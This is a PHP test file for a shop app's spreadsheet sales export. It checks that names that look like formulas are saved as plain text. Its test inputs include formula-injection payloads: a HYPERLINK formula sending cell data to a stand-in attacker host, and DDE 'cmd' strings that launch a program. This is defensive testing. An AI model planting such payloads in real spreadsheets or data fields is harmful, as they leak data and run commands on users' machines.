<?php

use App\Models\Category;
use App\Models\Product;
use App\Models\User;
use Database\Seeders\RolesAndPermissionsSeeder;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Worksheet\Worksheet;

beforeEach(function () {
    $this->seed(RolesAndPermissionsSeeder::class);
    $this->travelTo(testToday()->setTime(8, 0));
    $this->owner = User::factory()->owner()->create();
});

/**
 * Sells one of a product with the given name, then exports the sales report and
 * opens the file the way a spreadsheet program would.
 */
function exportedSheetFor(string $name, string $sku = 'X-1'): Worksheet
{
    $product = Product::factory()->for(Category::factory()->create(['name' => 'Food']))->create(['name' => $name, 'sku' => $sku]);
    sell($product, [['2026-10-01', 3, 10]]);

    $response = test()->actingAs(User::query()->where('email', '!=', '')->first())->get(route('reports.export', ['sales', 'xlsx']));

    return IOFactory::load($response->baseResponse->getFile()->getPathname())->getSheet(0);
}

it('stores text that looks like a formula as plain text, exactly as typed', function (string $typed) {
    $sheet = exportedSheetFor($typed);

    $cell = $sheet->getCell('B2');

    expect($cell->getDataType())->toBe(DataType::TYPE_STRING)
        // A spreadsheet file stores a lone carriage return as a newline; the text is otherwise as typed.
        ->and(str_replace('', '
', (string) $cell->getValue()))->toBe(str_replace('', '
', $typed))
        ->and($cell->isFormula())->toBeFalse();
})->with([
    'a formula' => ['=1+1'],
    'a formula that fetches something' => ['=HYPERLINK("http://evil.example/?x="&A1,"click")'],
    'a command' => ['=cmd|\' /C calc\'!A0'],
    'a sum' => ['@SUM(1+1)*cmd|\' /C calc\'!A0'],
    'a plus' => ['+1+1'],
    'a minus' => ['-2+3'],
    'a tab first' => ["\t=1+1"],
    'a return first' => ["\r=1+1"],
]);

it('marks such a cell so the program shows it as typed even after the file is saved again', function () {
    $sheet = exportedSheetFor('=1+1');

    expect($sheet->getStyle('B2')->getQuotePrefix())->toBeTrue();
});

it('leaves ordinary text alone', function (string $typed) {
    $sheet = exportedSheetFor($typed);

    $cell = $sheet->getCell('B2');

    expect($cell->getValue())->toBe($typed)
        ->and($cell->getDataType())->toBe(DataType::TYPE_STRING)
        ->and($sheet->getStyle('B2')->getQuotePrefix())->toBeFalse();
})->with([
    'a name' => ['Rice 5 kg'],
    'a name with an equals sign inside' => ['Mix 2=1 pack'],
    'a name that ends in a minus' => ['Sugar -'],
    'a name with a plus inside' => ['Vitamin B+'],
    'an email-like name' => ['info@example.test'],
]);

it('keeps numbers as numbers, even negative ones, and money and dates as such', function () {
    $sheet = exportedSheetFor('Rice');

    expect($sheet->getCell('E2')->getDataType())->toBe(DataType::TYPE_NUMERIC)
        ->and($sheet->getCell('E2')->getValue())->toEqual(3)
        ->and($sheet->getCell('F2')->getDataType())->toBe(DataType::TYPE_NUMERIC)
        ->and($sheet->getCell('F2')->getValue())->toEqual(30);
});

it('protects the About sheet too, where the filters and notes are written', function () {
    $category = Category::factory()->create(['name' => '=1+1']);
    $product = Product::factory()->for($category)->create();
    sell($product, [['2026-10-01', 1, 10]]);

    $response = $this->actingAs($this->owner)->get(route('reports.export', ['sales', 'xlsx', 'category' => $category->id]));
    $about = IOFactory::load($response->baseResponse->getFile()->getPathname())->getSheetByName('About');

    $found = collect($about->toArray(null, false, false, false))->flatten()->filter(fn ($value) => is_string($value) && str_contains($value, 'Category: =1+1'));

    expect($found)->not->toBeEmpty();

    foreach ($about->getRowIterator() as $row) {
        foreach ($row->getCellIterator() as $cell) {
            expect($cell->isFormula())->toBeFalse();
        }
    }
});

it('contains no formulas at all in the file, whatever was typed', function () {
    exportedSheetFor('=1+1');

    $response = test()->actingAs($this->owner)->get(route('reports.export', ['sales', 'xlsx']));
    $zip = new ZipArchive;
    $zip->open($response->baseResponse->getFile()->getPathname());

    $xml = '';

    for ($i = 0; $i < $zip->numFiles; $i++) {
        if (str_starts_with((string) $zip->getNameIndex($i), 'xl/worksheets/')) {
            $xml .= $zip->getFromIndex($i);
        }
    }

    expect($xml)->not->toBe('')->and($xml)->not->toContain('<f>')->and($xml)->not->toContain('<f ');
});
